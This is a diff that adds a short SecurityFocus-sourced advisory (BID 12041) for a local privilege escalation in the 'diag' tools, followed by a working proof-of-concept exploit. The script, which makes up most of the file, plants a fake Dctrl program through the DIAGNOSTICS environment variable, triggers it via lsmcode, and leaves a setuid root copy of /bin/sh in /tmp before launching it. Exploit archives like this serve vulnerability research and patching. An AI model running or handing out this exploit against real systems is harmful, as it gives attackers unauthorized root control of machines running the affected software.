@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/12041/info
+
+diag is reported prone to a local privilege escalation vulnerability. This issue is due to a failure of certain diag applications to properly implement security controls when executing an application specified by the 'DIAGNOSTICS' environment variable.
+
+A local attacker may leverage this issue to gain superuser privileges on a computer running the affected software. 
+
+mkdirhier /tmp/aap/bin
+export DIAGNOSTICS=/tmp/aap
+cat > /tmp/aap/bin/Dctrl << EOF
+#!/bin/sh
+cp /bin/sh /tmp/.shh
+chown root:system /tmp/.shh
+chmod u+s /tmp/.shh
+EOF
+chmod a+x /tmp/aap/bin/Dctrl
+lsmcode
+/tmp/.shh 
